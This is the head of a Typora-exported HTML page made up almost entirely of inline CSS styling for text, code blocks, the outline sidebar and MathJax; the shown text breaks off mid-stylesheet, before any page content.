<!doctype html>
<html>
<head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>

<link href='https://fonts.loli.net/css?family=PT+Serif:400,400italic,700,700italic&subset=latin,cyrillic-ext,cyrillic,latin-ext' rel='stylesheet' type='text/css' /><style type='text/css'>html {overflow-x: initial !important;}:root { --bg-color:#ffffff; --text-color:#333333; --select-text-bg-color:#B5D6FC; --select-text-font-color:auto; --monospace:"Lucida Console",Consolas,"Courier",monospace; --title-bar-height:20px; }
.mac-os-11 { --title-bar-height:28px; }
html { font-size: 14px; background-color: var(--bg-color); color: var(--text-color); font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; }
body { margin: 0px; padding: 0px; height: auto; inset: 0px; font-size: 1rem; line-height: 1.42857; overflow-x: hidden; background: inherit; tab-size: 4; }
iframe { margin: auto; }
a.url { word-break: break-all; }
a:active, a:hover { outline: 0px; }
.in-text-selection, ::selection { text-shadow: none; background: var(--select-text-bg-color); color: var(--select-text-font-color); }
#write { margin: 0px auto; height: auto; width: inherit; word-break: normal; overflow-wrap: break-word; position: relative; white-space: normal; overflow-x: visible; padding-top: 36px; }
#write.first-line-indent p { text-indent: 2em; }
#write.first-line-indent li p, #write.first-line-indent p * { text-indent: 0px; }
#write.first-line-indent li { margin-left: 2em; }
.for-image #write { padding-left: 8px; padding-right: 8px; }
body.typora-export { padding-left: 30px; padding-right: 30px; }
.typora-export .footnote-line, .typora-export li, .typora-export p { white-space: pre-wrap; }
.typora-export .task-list-item input { pointer-events: none; }
@media screen and (max-width: 500px) {
  body.typora-export { padding-left: 0px; padding-right: 0px; }
  #write { padding-left: 20px; padding-right: 20px; }
  .CodeMirror-sizer { margin-left: 0px !important; }
  .CodeMirror-gutters { display: none !important; }
}
#write li > figure:last-child { margin-bottom: 0.5rem; }
#write ol, #write ul { position: relative; }
img { max-width: 100%; vertical-align: middle; image-orientation: from-image; }
button, input, select, textarea { color: inherit; font: inherit; }
input[type="checkbox"], input[type="radio"] { line-height: normal; padding: 0px; }
*, ::after, ::before { box-sizing: border-box; }
#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p, #write pre { width: inherit; }
#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p { position: relative; }
p { line-height: inherit; }
h1, h2, h3, h4, h5, h6 { break-after: avoid-page; break-inside: avoid; orphans: 4; }
p { orphans: 4; }
h1 { font-size: 2rem; }
h2 { font-size: 1.8rem; }
h3 { font-size: 1.6rem; }
h4 { font-size: 1.4rem; }
h5 { font-size: 1.2rem; }
h6 { font-size: 1rem; }
.md-math-block, .md-rawblock, h1, h2, h3, h4, h5, h6, p { margin-top: 1rem; margin-bottom: 1rem; }
.hidden { display: none; }
.md-blockmeta { color: rgb(204, 204, 204); font-weight: 700; font-style: italic; }
a { cursor: pointer; }
sup.md-footnote { padding: 2px 4px; background-color: rgba(238, 238, 238, 0.7); color: rgb(85, 85, 85); border-radius: 4px; cursor: pointer; }
sup.md-footnote a, sup.md-footnote a:hover { color: inherit; text-transform: inherit; text-decoration: inherit; }
#write input[type="checkbox"] { cursor: pointer; width: inherit; height: inherit; }
figure { overflow-x: auto; margin: 1.2em 0px; max-width: calc(100% + 16px); padding: 0px; }
figure > table { margin: 0px; }
tr { break-inside: avoid; break-after: auto; }
thead { display: table-header-group; }
table { border-collapse: collapse; border-spacing: 0px; width: 100%; overflow: auto; break-inside: auto; text-align: left; }
table.md-table td { min-width: 32px; }
.CodeMirror-gutters { border-right: 0px; background-color: inherit; }
.CodeMirror-linenumber { user-select: none; }
.CodeMirror { text-align: left; }
.CodeMirror-placeholder { opacity: 0.3; }
.CodeMirror pre { padding: 0px 4px; }
.CodeMirror-lines { padding: 0px; }
div.hr:focus { cursor: none; }
#write pre { white-space: pre-wrap; }
#write.fences-no-line-wrapping pre { white-space: pre; }
#write pre.ty-contain-cm { white-space: normal; }
.CodeMirror-gutters { margin-right: 4px; }
.md-fences { font-size: 0.9rem; display: block; break-inside: avoid; text-align: left; overflow: visible; white-space: pre; background: inherit; position: relative !important; }
.md-fences-adv-panel { width: 100%; margin-top: 10px; text-align: center; padding-top: 0px; padding-bottom: 8px; overflow-x: auto; }
#write .md-fences.mock-cm { white-space: pre-wrap; }
.md-fences.md-fences-with-lineno { padding-left: 0px; }
#write.fences-no-line-wrapping .md-fences.mock-cm { white-space: pre; overflow-x: auto; }
.md-fences.mock-cm.md-fences-with-lineno { padding-left: 8px; }
.CodeMirror-line, twitterwidget { break-inside: avoid; }
.footnotes { opacity: 0.8; font-size: 0.9rem; margin-top: 1em; margin-bottom: 1em; }
.footnotes + .footnotes { margin-top: 0px; }
.md-reset { margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: top; background: 0px 0px; text-decoration: none; text-shadow: none; float: none; position: static; width: auto; height: auto; white-space: nowrap; cursor: inherit; -webkit-tap-highlight-color: transparent; line-height: normal; font-weight: 400; text-align: left; box-sizing: content-box; direction: ltr; }
li div { padding-top: 0px; }
blockquote { margin: 1rem 0px; }
li .mathjax-block, li p { margin: 0.5rem 0px; }
li blockquote { margin: 1rem 0px; }
li { margin: 0px; position: relative; }
blockquote > :last-child { margin-bottom: 0px; }
blockquote > :first-child, li > :first-child { margin-top: 0px; }
.footnotes-area { color: rgb(136, 136, 136); margin-top: 0.714rem; padding-bottom: 0.143rem; white-space: normal; }
#write .footnote-line { white-space: pre-wrap; }
@media print {
  body, html { border: 1px solid transparent; height: 99%; break-after: avoid; break-before: avoid; font-variant-ligatures: no-common-ligatures; }
  #write { margin-top: 0px; padding-top: 0px; border-color: transparent !important; }
  .typora-export * { -webkit-print-color-adjust: exact; }
  .typora-export #write { break-after: avoid; }
  .typora-export #write::after { height: 0px; }
  .is-mac table { break-inside: avoid; }
  .typora-export-show-outline .typora-export-sidebar { display: none; }
}
.footnote-line { margin-top: 0.714em; font-size: 0.7em; }
a img, img a { cursor: pointer; }
pre.md-meta-block { font-size: 0.8rem; min-height: 0.8rem; white-space: pre-wrap; background: rgb(204, 204, 204); display: block; overflow-x: hidden; }
p > .md-image:only-child:not(.md-img-error) img, p > img:only-child { display: block; margin: auto; }
#write.first-line-indent p > .md-image:only-child:not(.md-img-error) img { left: -2em; position: relative; }
p > .md-image:only-child { display: inline-block; width: 100%; }
#write .MathJax_Display { margin: 0.8em 0px 0px; }
.md-math-block { width: 100%; }
.md-math-block:not(:empty)::after { display: none; }
.MathJax_ref { fill: currentcolor; }
[contenteditable="true"]:active, [contenteditable="true"]:focus, [contenteditable="false"]:active, [contenteditable="false"]:focus { outline: 0px; box-shadow: none; }
.md-task-list-item { position: relative; list-style-type: none; }
.task-list-item.md-task-list-item { padding-left: 0px; }
.md-task-list-item > input { position: absolute; top: 0px; left: 0px; margin-left: -1.2em; margin-top: calc(1em - 10px); border: none; }
.math { font-size: 1rem; }
.md-toc { min-height: 3.58rem; position: relative; font-size: 0.9rem; border-radius: 10px; }
.md-toc-content { position: relative; margin-left: 0px; }
.md-toc-content::after, .md-toc::after { display: none; }
.md-toc-item { display: block; color: rgb(65, 131, 196); }
.md-toc-item a { text-decoration: none; }
.md-toc-inner:hover { text-decoration: underline; }
.md-toc-inner { display: inline-block; cursor: pointer; }
.md-toc-h1 .md-toc-inner { margin-left: 0px; font-weight: 700; }
.md-toc-h2 .md-toc-inner { margin-left: 2em; }
.md-toc-h3 .md-toc-inner { margin-left: 4em; }
.md-toc-h4 .md-toc-inner { margin-left: 6em; }
.md-toc-h5 .md-toc-inner { margin-left: 8em; }
.md-toc-h6 .md-toc-inner { margin-left: 10em; }
@media screen and (max-width: 48em) {
  .md-toc-h3 .md-toc-inner { margin-left: 3.5em; }
  .md-toc-h4 .md-toc-inner { margin-left: 5em; }
  .md-toc-h5 .md-toc-inner { margin-left: 6.5em; }
  .md-toc-h6 .md-toc-inner { margin-left: 8em; }
}
a.md-toc-inner { font-size: inherit; font-style: inherit; font-weight: inherit; line-height: inherit; }
.footnote-line a:not(.reversefootnote) { color: inherit; }
.md-attr { display: none; }
.md-fn-count::after { content: "."; }
code, pre, samp, tt { font-family: var(--monospace); }
kbd { margin: 0px 0.1em; padding: 0.1em 0.6em; font-size: 0.8em; color: rgb(36, 39, 41); background: rgb(255, 255, 255); border: 1px solid rgb(173, 179, 185); border-radius: 3px; box-shadow: rgba(12, 13, 14, 0.2) 0px 1px 0px, rgb(255, 255, 255) 0px 0px 0px 2px inset; white-space: nowrap; vertical-align: middle; }
.md-comment { color: rgb(162, 127, 3); opacity: 0.6; font-family: var(--monospace); }
code { text-align: left; vertical-align: initial; }
a.md-print-anchor { white-space: pre !important; border-width: initial !important; border-style: none !important; border-color: initial !important; display: inline-block !important; position: absolute !important; width: 1px !important; right: 0px !important; outline: 0px !important; background: 0px 0px !important; text-decoration: initial !important; text-shadow: initial !important; }
.os-windows.monocolor-emoji .md-emoji { font-family: "Segoe UI Symbol", sans-serif; }
.md-diagram-panel > svg { max-width: 100%; }
[lang="flow"] svg, [lang="mermaid"] svg { max-width: 100%; height: auto; }
[lang="mermaid"] .node text { font-size: 1rem; }
table tr th { border-bottom: 0px; }
video { max-width: 100%; display: block; margin: 0px auto; }
iframe { max-width: 100%; width: 100%; border: none; }
.highlight td, .highlight tr { border: 0px; }
mark { background: rgb(255, 255, 0); color: rgb(0, 0, 0); }
.md-html-inline .md-plain, .md-html-inline strong, mark .md-inline-math, mark strong { color: inherit; }
.md-expand mark .md-meta { opacity: 0.3 !important; }
mark .md-meta { color: rgb(0, 0, 0); }
@media print {
  .typora-export h1, .typora-export h2, .typora-export h3, .typora-export h4, .typora-export h5, .typora-export h6 { break-inside: avoid; }
}
.md-diagram-panel .messageText { stroke: none !important; }
.md-diagram-panel .start-state { fill: var(--node-fill); }
.md-diagram-panel .edgeLabel rect { opacity: 1 !important; }
.md-fences.md-fences-math { font-size: 1em; }
.md-fences-advanced:not(.md-focus) { padding: 0px; white-space: nowrap; border: 0px; }
.md-fences-advanced:not(.md-focus) { background: inherit; }
.typora-export-show-outline .typora-export-content { max-width: 1440px; margin: auto; display: flex; flex-direction: row; }
.typora-export-sidebar { width: 300px; font-size: 0.8rem; margin-top: 80px; margin-right: 18px; }
.typora-export-show-outline #write { --webkit-flex:2; flex: 2 1 0%; }
.typora-export-sidebar .outline-content { position: fixed; top: 0px; max-height: 100%; overflow: hidden auto; padding-bottom: 30px; padding-top: 60px; width: 300px; }
@media screen and (max-width: 1024px) {
  .typora-export-sidebar, .typora-export-sidebar .outline-content { width: 240px; }
}
@media screen and (max-width: 800px) {
  .typora-export-sidebar { display: none; }
}
.outline-content li, .outline-content ul { margin-left: 0px; margin-right: 0px; padding-left: 0px; padding-right: 0px; list-style: none; }
.outline-content ul { margin-top: 0px; margin-bottom: 0px; }
.outline-content strong { font-weight: 400; }
.outline-expander { width: 1rem; height: 1.42857rem; position: relative; display: table-cell; vertical-align: middle; cursor: pointer; padding-left: 4px; }
.outline-expander::before { content: ""; position: relative; font-family: Ionicons; display: inline-block; font-size: 8px; vertical-align: middle; }
.outline-item { padding-top: 3px; padding-bottom: 3px; cursor: pointer; }
.outline-expander:hover::before { content: ""; }
.outline-h1 > .outline-item { padding-left: 0px; }
.outline-h2 > .outline-item { padding-left: 1em; }
.outline-h3 > .outline-item { padding-left: 2em; }
.outline-h4 > .outline-item { padding-left: 3em; }
.outline-h5 > .outline-item { padding-left: 4em; }
.outline-h6 > .outline-item { padding-left: 5em; }
.outline-label { cursor: pointer; display: table-cell; vertical-align: middle; text-decoration: none; color: inherit; }
.outline-label:hover { text-decoration: underline; }
.outline-item:hover { border-color: rgb(245, 245, 245); background-color: var(--item-hover-bg-color); }
.outline-item:hover { margin-left: -28px; margin-right: -28px; border-left: 28px solid transparent; border-right: 28px solid transparent; }
.outline-item-single .outline-expander::before, .outline-item-single .outline-expander:hover::before { display: none; }
.outline-item-open > .outline-item > .outline-expander::before { content: ""; }
.outline-children { display: none; }
.info-panel-tab-wrapper { display: none; }
.outline-item-open > .outline-children { display: block; }
.typora-export .outline-item { padding-top: 1px; padding-bottom: 1px; }
.typora-export .outline-item:hover { margin-right: -8px; border-right: 8px solid transparent; }
.typora-export .outline-expander::before { content: "+"; font-family: inherit; top: -1px; }
.typora-export .outline-expander:hover::before, .typora-export .outline-item-open > .outline-item > .outline-expander::before { content: "−"; }
.typora-export-collapse-outline .outline-children { display: none; }
.typora-export-collapse-outline .outline-item-open > .outline-children, .typora-export-no-collapse-outline .outline-children { display: block; }
.typora-export-no-collapse-outline .outline-expander::before { content: "" !important; }
.typora-export-show-outline .outline-item-active > .outline-item .outline-label { font-weight: 700; }
.md-inline-math-container mjx-container { zoom: 0.95; }


.CodeMirror { height: auto; }
.CodeMirror.cm-s-inner { background: inherit; }
.CodeMirror-scroll { overflow: auto hidden; z-index: 3; }
.CodeMirror-gutter-filler, .CodeMirror-scrollbar-filler { background-color: rgb(255, 255, 255); }
.CodeMirror-gutters { border-right: 1px solid rgb(221, 221, 221); background: inherit; white-space: nowrap; }
.CodeMirror-linenumber { padding: 0px 3px 0px 5px; text-align: right; color: rgb(153, 153, 153); }
.cm-s-inner .cm-keyword { color: rgb(119, 0, 136); }
.cm-s-inner .cm-atom, .cm-s-inner.cm-atom { color: rgb(34, 17, 153); }
.cm-s-inner .cm-number { color: rgb(17, 102, 68); }
.cm-s-inner .cm-def { color: rgb(0, 0, 255); }
.cm-s-inner .cm-variable { color: rgb(0, 0, 0); }
.cm-s-inner .cm-variable-2 { color: rgb(0, 85, 170); }
.cm-s-inner .cm-variable-3 { color: rgb(0, 136, 85); }
.cm-s-inner .cm-string { color: rgb(170, 17, 17); }
.cm-s-inner .cm-property { color: rgb(0, 0, 0); }
.cm-s-inner .cm-operator { color: rgb(152, 26, 26); }
.cm-s-inner .cm-comment, .cm-s-inner.cm-comment { color: rgb(170, 85, 0); }
.cm-s-inner .cm-string-2 { color: rgb(255, 85, 0); }
.cm-s-inner .cm-meta { color: rgb(85, 85, 85); }
.cm-s-inner .cm-qualifier { color: rgb(85, 85, 85); }
.cm-s-inner .cm-builtin { color: rgb(51, 0, 170); }
.cm-s-inner .cm-bracket { color: rgb(153, 153, 119); }
.cm-s-inner .cm-tag { color: rgb(17, 119, 0); }
.cm-s-inner .cm-attribute { color: rgb(0, 0, 204); }
.cm-s-inner .cm-header, .cm-s-inner.cm-header { color: rgb(0, 0, 255); }
.cm-s-inner .cm-quote, .cm-s-inner.cm-quote { color: rgb(0, 153, 0); }
.cm-s-inner .cm-hr, .cm-s-inner.cm-hr { color: rgb(153, 153, 153); }
.cm-s-inner .cm-link, .cm-s-inner.cm-link { color: rgb(0, 0, 204); }
.cm-negative { color: rgb(221, 68, 68); }
.cm-positive { color: rgb(34, 153, 34); }
.cm-header, .cm-strong { font-weight: 700; }
.cm-del { text-decoration: line-through; }
.cm-em { font-style: italic; }
.cm-link { text-decoration: underline; }
.cm-error { color: red; }
.cm-invalidchar { color: red; }
.cm-constant { color: rgb(38, 139, 210); }
.cm-defined { color: rgb(181, 137, 0); }
div.CodeMirror span.CodeMirror-matchingbracket { color: rgb(0, 255, 0); }
div.CodeMirror span.CodeMirror-nonmatchingbracket { color: rgb(255, 34, 34); }
.cm-s-inner .CodeMirror-activeline-background { background: inherit; }
.CodeMirror { position: relative; overflow: hidden; }
.CodeMirror-scroll { height: 100%; outline: 0px; position: relative; box-sizing: content-box; background: inherit; }
.CodeMirror-sizer { position: relative; }
.CodeMirror-gutter-filler, .CodeMirror-hscrollbar, .CodeMirror-scrollbar-filler, .CodeMirror-vscrollbar { position: absolute; z-index: 6; display: none; outline: 0px; }
.CodeMirror-vscrollbar { right: 0px; top: 0px; overflow: hidden; }
.CodeMirror-hscrollbar { bottom: 0px; left: 0px; overflow: auto hidden; }
.CodeMirror-scrollbar-filler { right: 0px; bottom: 0px; }
.CodeMirror-gutter-filler { left: 0px; bottom: 0px; }
.CodeMirror-gutters { position: absolute; left: 0px; top: 0px; padding-bottom: 10px; z-index: 3; overflow-y: hidden; }
.CodeMirror-gutter { white-space: normal; height: 100%; box-sizing: content-box; padding-bottom: 30px; margin-bottom: -32px; display: inline-block; }
.CodeMirror-gutter-wrapper { position: absolute; z-index: 4; background: 0px 0px !important; border: none !important; }
.CodeMirror-gutter-background { position: absolute; top: 0px; bottom: 0px; z-index: 4; }
.CodeMirror-gutter-elt { position: absolute; cursor: default; z-index: 4; }
.CodeMirror-lines { cursor: text; }
.CodeMirror pre { border-radius: 0px; border-width: 0px; background: 0px 0px; font-family: inherit; font-size: inherit; margin: 0px; white-space: pre; overflow-wrap: normal; color: inherit; z-index: 2; position: relative; overflow: visible; }
.CodeMirror-wrap pre { overflow-wrap: break-word; white-space: pre-wrap; word-break: normal; }
.CodeMirror-code pre { border-right: 30px solid transparent; width: fit-content; }
.CodeMirror-wrap .CodeMirror-code pre { border-right: none; width: auto; }
.CodeMirror-linebackground { position: absolute; inset: 0px; z-index: 0; }
.CodeMirror-linewidget { position: relative; z-index: 2; overflow: auto; }
.CodeMirror-wrap .CodeMirror-scroll { overflow-x: hidden; }
.CodeMirror-measure { position: absolute; width: 100%; height: 0px; overflow: hidden; visibility: hidden; }
.CodeMirror-measure pre { position: static; }
.CodeMirror div.CodeMirror-cursor { position: absolute; visibility: hidden; border-right: none; width: 0px; }
.CodeMirror div.CodeMirror-cursor { visibility: hidden; }
.CodeMirror-focused div.CodeMirror-cursor { visibility: inherit; }
.cm-searching { background: rgba(255, 255, 0, 0.4); }
span.cm-underlined { text-decoration: underline; }
span.cm-strikethrough { text-decoration: line-through; }
.cm-tw-syntaxerror { color: rgb(255, 255, 255); background-color: rgb(153, 0, 0); }
.cm-tw-deleted { text-decoration: line-through; }
.cm-tw-header5 { font-weight: 700; }
.cm-tw-listitem:first-child { padding-left: 10px; }
.cm-tw-box { border-style: solid; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px; border-color: inherit; border-top-width: 0px !important; }
.cm-tw-underline { text-decoration: underline; }
@media print {
  .CodeMirror div.CodeMirror-cursor { visibility: hidden; }
}


/* meyer reset -- http://meyerweb.com/eric/tools/css/reset/ , v2.0 | 20110126 | License: none (public domain) */

@include-when-export url(https://fonts.loli.net/css?family=PT+Serif:400,400italic,700,700italic&subset=latin,cyrillic-ext,cyrillic,latin-ext);

/* =========== */

/* pt-serif-regular - latin */
/* pt-serif-italic - latin */
/* pt-serif-700 - latin */
/* pt-serif-700italic - latin */
:root {
	--active-file-bg-color: #dadada;
	--active-file-bg-color: rgba(32, 43, 51, 0.63);
	--active-file-text-color: white;
	--bg-color: #f3f2ee;
	--text-color: #1f0909;
	--control-text-color: #444;
	--rawblock-edit-panel-bd: #e5e5e5;

	--select-text-bg-color: rgba(32, 43, 51, 0.63);
  --select-text-font-color: white;
}

pre {
	--select-text-bg-color: #36284e;
	--select-text-font-color: #fff;
}

html {
	font-size: 16px;
	-webkit-font-smoothing: antialiased;
}

html, body {
	background-color: #f3f2ee;
	font-family: "PT Serif", 'Times New Roman', Times, serif;
	color: #1f0909;
	line-height: 1.5em;
}

/*#write {
	overflow-x: auto;
    max-width: initial;
	padding-left: calc(50% - 17em);
    padding-right: calc(50% - 17em);
}

@media (max-width: 36em) {
 	#write {
 		padding-left: 1em;
    	padding-right: 1em;
 	}
}*/

#write {
	max-width: 40em;
}

@media only screen and (min-width: 1400px) {
	#write {
			max-width: 914px;
	}
}

ol li {
	list-style-type: decimal;
	list-style-position: outside;
}
ul li {
	list-style-type: disc;
	list-style-position: outside;
}

ol,
ul {
	list-style: none;
}

blockquote,
q {
	quotes: none;
}
blockquote:before,
blockquote:after,
q:before,
q:after {
	content: '';
	content: none;
}
table {
	border-collapse: collapse;
	border-spacing: 0;
}
/* styles */

/* ====== */

/* headings */

h1,
h2,
h3,
h4,
h5,
h6 {
	font-weight: bold;
}
h1 {
	font-size: 1.875em;
	/*30 / 16*/
	line-height: 1.6em;
	/* 48 / 30*/
	margin-top: 2em;
}
h2,
h3 {
	font-size: 1.3125em;
	/*21 / 16*/
	line-height: 1.15;
	/*24 / 21*/
	margin-top: 2.285714em;
	/*48 / 21*/
	margin-bottom: 1.15em;
	/*24 / 21*/
}
h3 {
	font-weight: normal;
}
h4 {
	font-size: 1.125em;
	/*18 / 16*/
	margin-top: 2.67em;
	/*48 / 18*/
}
h5,
h6 {
	font-size: 1em;
	/*16*/
}
h1 {
	border-bottom: 1px solid;
	margin-bottom: 1.875em;
	padding-bottom: 0.8125em;
}
/* links */

a {
	text-decoration: none;
	color: #065588;
}
a:hover,
a:active {
	text-decoration: underline;
}
/* block spacing */

p,
blockquote,
.md-fences {
	margin-bottom: 1.5em;
}
h1,
h2,
h3,
h4,
h5,
h6 {
	margin-bottom: 1.5em;
}
/* blockquote */

blockquote {
	font-style: italic;
	border-left: 5px solid;
	margin-left: 2em;
	padding-left: 1em;
}
/* lists */

ul,
ol {
	margin: 0 0 1.5em 1.5em;
}
/* tables */
.md-meta,.md-before, .md-after {
	color:#999;
}

table {
	margin-bottom: 1.5em;
	/*24 / 16*/
	font-size: 1em;
	/* width: 100%; */
}
thead th,
tfoot th {
	padding: .25em .25em .25em .4em;
	text-transform: uppercase;
}
th {
	text-align: left;
}
td {
	vertical-align: top;
	padding: .25em .25em .25em .4em;
}

code,
.md-fences {
	background-color: #dadada;
}

code {
	padding-left: 2px;
	padding-right: 2px;
}

.md-fences {
	margin-left: 2em;
	margin-bottom: 3em;
	padding-left: 1ch;
	padding-right: 1ch;
}

pre,
code,
tt {
	font-size: .875em;
	line-height: 1.714285em;
}
/* some fixes */

h1 {
	line-height: 1.3em;
	font-weight: normal;
	margin-bottom: 0.5em;
}

p + ul,
p + ol{
	margin-top: .5em;
}

h3 + ul,
h4 + ul,
h5 + ul,
h6 + ul,
h3 + ol,
h4 + ol,
h5 + ol,
h6 + ol {
	margin-top: .5em;
}

li > ul,
li > ol {
	margin-top: inherit;
	margin-bottom: 0;
}

li ol>li {
	list-style-type: lower-alpha;
}

li li ol>li{
	list-style-type: lower-roman;
}

h2,
h3 {
	margin-bottom: .75em;
}
hr {
	border-top: none;
	border-right: none;
	border-bottom: 1px solid;
	border-left: none;
}
h1 {
	border-color: #c5c5c5;
}
blockquote {
	border-color: #bababa;
	color: #656565;
}

blockquote ul,
blockquote ol {
	margin-left:0;
}

.ty-table-edit {
	background-color: transparent;
}
thead {
	background-color: #dadada;
}
tr:nth-child(even) {
	background: #e8e7e7;
}
hr {
	border-color: #c5c5c5;
}
.task-list{
	padding-left: 1rem;
}

.md-task-list-item {
	padding-left: 1.5rem;
	list-style-type: none;
}

.md-task-list-item > input:before {
	content: '\221A';
	display: inline-block;
	width: 1.25rem;
  	height: 1.6rem;
	vertical-align: middle;
	text-align: center;
	color: #ddd;
	background-color: #F3F2EE;
}

.md-task-list-item > input:checked:before,
.md-task-list-item > input[checked]:before{
	color: inherit;
}

#write pre.md-meta-block {
	min-height: 1.875rem;
	color: #555;
	border: 0px;
	background: transparent;
	margin-top: -4px;
	margin-left: 1em;
	margin-top: 1em;
}

.md-image>.md-meta {
	color: #9B5146;
}

.md-image>.md-meta{
	font-family: Menlo, 'Ubuntu Mono', Consolas, 'Courier New', 'Microsoft Yahei', 'Hiragino Sans GB', 'WenQuanYi Micro Hei', serif;
}


#write>h3.md-focus:before{
	left: -1.5rem;
	color:#999;
	border-color:#999;
}
#write>h4.md-focus:before{
	left: -1.5rem;
	top: .25rem;
	color:#999;
	border-color:#999;
}
#write>h5.md-focus:before{
	left: -1.5rem;
	top: .0.3125rem;
	color:#999;
	border-color:#999;
}
#write>h6.md-focus:before{
	left: -1.5rem;
	top: 0.3125rem;
	color:#999;
	border-color:#999;
}

.md-toc:focus .md-toc-content{
	margin-top: 19px;
}

.md-toc-content:empty:before{
	color: #065588;
}
.md-toc-item {
	color: #065588;
}
#write div.md-toc-tooltip {
	background-color: #f3f2ee;
}

#typora-sidebar {
	background-color: #f3f2ee;
	-webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, 0.375);
  	box-shadow: 0 6px 12px rgba(0, 0, 0, 0.375);
}

.pin-outline #typora-sidebar {
	background: inherit;
	box-shadow: none;
	border-right: 1px dashed;
}

.pin-outline #typora-sidebar:hover .outline-title-wrapper {
	border-left:1px dashed;
}

.outline-item:hover {
  background-color: #dadada;
  border-left: 28px solid #dadada;
  border-right: 18px solid #dadada;
}

.typora-node .outline-item:hover {
  	border-right: 28px solid #dadada;
}

.outline-expander:before {
  content: "\f0da";
  font-family: FontAwesome;
  font-size:14px;
  top: 1px;
}

.outline-expander:hover:before,
.outline-item-open>.outline-item>.outline-expander:before {
  content: "\f0d7";
}

.modal-content {
	background-color: #f3f2ee;
}

.auto-suggest-container ul li {
	list-style-type: none;
}

/** UI for electron */

.megamenu-menu,
#top-titlebar, #top-titlebar *,
.megamenu-content {
	background: #f3f2ee;
	color: #1f0909;
}

.megamenu-menu-header {
	border-bottom: 1px dashed #202B33;
}

.megamenu-menu {
	box-shadow: none;
	border-right: 1px dashed;
}

header, .context-menu, .megamenu-content, footer {
	font-family: "PT Serif", 'Times New Roman', Times, serif;
    color: #1f0909;
}

#megamenu-back-btn {
	color: #1f0909;
	border-color: #1f0909;
}

.megamenu-menu-header #megamenu-menu-header-title:before {
	color: #1f0909;
}

.megamenu-menu-list li a:hover, .megamenu-menu-list li a.active {
	color: inherit;
	background-color: #e8e7df;
}

.long-btn:hover {
	background-color: #e8e7df;
}

#recent-file-panel tbody tr:nth-child(2n-1) {
    background-color: transparent !important;
}

.megamenu-menu-panel tbody tr:hover td:nth-child(2) {
    color: inherit;
}

.megamenu-menu-panel .btn {
	background-color: #D2D1D1;
}

.btn-default {
	background-color: transparent;
}

.typora-sourceview-on #toggle-sourceview-btn,
.ty-show-word-count #footer-word-count {
	background: #c7c5c5;
}

#typora-quick-open {
    background-color: inherit;
}

.md-diagram-panel {
	margin-top: 8px;
}

.file-list-item-file-name {
	font-weight: initial;
}

.file-list-item-summary {
	opacity: 1;
}

.file-list-item {
	color: #777;
}

.file-list-item.active {
	background-color: inherit;
	color: black;
}

.ty-side-sort-btn.active {
	background-color: inherit;
}

.file-list-item.active .file-list-item-file-name  {
	font-weight: bold;
}

.file-list-item{
    opacity:1 !important;
}

.file-library-node.active>.file-node-background{
	background-color: rgba(32, 43, 51, 0.63);
	background-color: var(--active-file-bg-color);
}

.file-tree-node.active>.file-node-content{
	color: white;
	color: var(--active-file-text-color);
}

.md-task-list-item>input {
	margin-left: -1.7em;
	margin-top: calc(1rem - 12px);
	-webkit-appearance: button;
}

input {
	border: 1px solid #aaa;
}

.megamenu-menu-header #megamenu-menu-header-title,
.megamenu-menu-header:hover, 
.megamenu-menu-header:focus {
	color: inherit;
}

.dropdown-menu .divider {
	border-color: #e5e5e5;
	opacity: 1;
}

/* https://github.com/typora/typora-issues/issues/2046 */
.os-windows-7 strong,
.os-windows-7 strong  {
	font-weight: 760;
}

.ty-preferences .btn-default {
	background: transparent;
}

.ty-preferences .window-header {
	border-bottom: 1px dashed #202B33;
	box-shadow: none;
}

#sidebar-loading-template, #sidebar-loading-template.file-list-item {
	color: #777;
}

.searchpanel-search-option-btn.active {
	background: #777;
	color: white;
}

.export-detail, .light .export-detail, 
.light .export-item.active, 
.light .export-items-list-control {
	background: #e0e0e0;
	border-radius: 2px;
	font-weight: 700;
	color: inherit
}


mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
  min-height: 1px;
  min-width: 1px;
}

mjx-container[jax="SVG"] > svg a {
  fill: blue;
  stroke: blue;
}

mjx-assistive-mml {
  position: absolute !important;
  top: 0px;
  left: 0px;
  clip: rect(1px, 1px, 1px, 1px);
  padding: 1px 0px 0px 0px !important;
  border: 0px !important;
  display: block !important;
  width: auto !important;
  overflow: hidden !important;
  -webkit-touch-callout: none;
  -webkit-user-select: none;
  -khtml-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

mjx-assistive-mml[display="block"] {
  width: 100% !important;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][display="true"][width="full"] {
  display: flex;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line], svg[data-table] > g > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame], svg[data-table] > g > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed, svg[data-table] > g > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted, svg[data-table] > g > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > g > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
